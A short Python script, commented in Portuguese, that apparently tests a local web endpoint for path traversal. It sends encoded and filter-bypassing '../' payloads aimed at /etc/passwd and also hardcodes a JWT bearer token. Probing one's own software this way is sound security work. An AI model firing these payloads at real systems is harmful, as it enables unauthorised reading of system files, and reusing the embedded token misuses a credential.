import requests

# --- CONFIGURAÇÕES ---
# Coloque a URL de um endpoint que aceita nomes de arquivo ou IDs
# Exemplo: http://host.docker.internal:8000/download?arquivo=
ALVO_URL = "http://localhost:8000/unit"
PARAMETRO_VULNERAVEL = "nome"  # O nome do parâmetro na URL (ex: ?file=...)
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJDdXB1YWN1TWFzdGVyIiwiZXhwIjoxNzY2NTI1MTk1LjA2MzUyOH0.gIYXjerrC5Yro_FTs9N7y8aSarGnbW-cZAuh4rPEePg"

# --- PAYLOADS (As variações mencionadas no seu texto) ---
PAYLOADS = [
    "../../../../etc/passwd",  # Básico
    ".././.././.././etc/passwd",  # Misturando / e ./
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL Encoded (../)
    "%252e%252e%252fetc%252fpasswd",  # Double URL Encoded
    "..%c0%af..%c0%afetc%c0%afpasswd",  # Unicode/UTF-8 inválido
    "....//....//etc/passwd",  # Bypass de filtro simples
    "/etc/passwd",  # Caminho absoluto direto
    "file:///etc/passwd",  # Esquema URI
]

headers = {"Authorization": f"Bearer {TOKEN}"}

print(f"--- TESTANDO PATH TRAVERSAL EM: {ALVO_URL} ---")

for payload in PAYLOADS:
    # Monta a URL: http://alvo.com/rota?file=../../etc/passwd
    params = {PARAMETRO_VULNERAVEL: payload}

    try:
        response = requests.post(ALVO_URL, params=params, headers=headers, timeout=5)

        # O arquivo /etc/passwd geralmente contém "root:x:0:0"
        if "root:" in response.text:
            print(f"[!!!] VULNERÁVEL! Payload funcionou: {payload}")
            print(f"      Conteúdo vazado: {response.text[:50]}...")
        elif response.status_code == 200:
            print(
                f"[ALERTA] Retornou 200 OK (mas sem conteúdo óbvio de root): {payload}"
            )
        else:
            print(f"[OK] Bloqueado ({response.status_code}) - Payload: {payload}")

    except Exception as e:
        print(f"Erro ao testar {payload}: {e}")

print("--- FIM DO TESTE ---")
